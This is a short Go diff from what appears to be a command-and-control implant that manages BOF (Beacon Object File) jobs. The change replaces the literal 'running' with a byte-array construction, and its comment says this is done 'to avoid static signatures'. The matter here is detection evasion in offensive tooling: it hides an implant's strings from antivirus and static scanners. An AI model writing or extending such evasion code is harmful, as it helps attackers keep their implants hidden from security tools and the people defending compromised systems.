@@ -8,6 +8,11 @@ import (
 	"time"
 )
 
+// Polling windows strings (constructed to avoid static signatures)
+var (
+	pwStatusRunning = string([]byte{0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67}) // running
+)
+
 // startAsyncBOFChecker starts a simple cleanup routine for BOF jobs
 // All output sending is now handled through ResultManager in the main polling loop
 func startAsyncBOFChecker() {
@@ -31,7 +36,7 @@ func cleanupBOFJobs() {
 			now := time.Now()
 			cleaned := 0
 			for id, job := range bofJobManager.jobs {
-				if job.Status != "running" && job.EndTime != nil {
+				if job.Status != pwStatusRunning && job.EndTime != nil {
 					if now.Sub(*job.EndTime) > 1*time.Hour {
 						delete(bofJobManager.jobs, id)
 						cleaned++
